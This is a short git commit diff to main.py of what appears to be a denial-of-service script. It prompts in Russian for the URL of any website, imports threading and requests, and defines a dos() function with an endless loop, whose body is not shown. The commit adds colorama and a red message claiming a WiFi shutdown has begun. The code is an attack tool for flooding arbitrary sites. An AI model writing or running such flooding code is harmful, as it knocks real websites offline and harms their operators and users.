b0572f831556165a494dd5b17b5d8e28dabd2eea
mistikmistio <minerkik@gmail.com>
2023-11-04 18:00:19 +0300

    OneCommit

--- main.py
+++ main.py
@@ -1,10 +1,13 @@
 # coding: utf8
 import threading
 import requests
+import colorama
 
 
 print("Введите ссылку на любой сайт:")
 url = input()
+
+print(colorama.Fore.RED + "ОТКЛЮЧЕНИЕ WIFI НАЧАЛОСЬ!")
 
 def dos():
  while True:
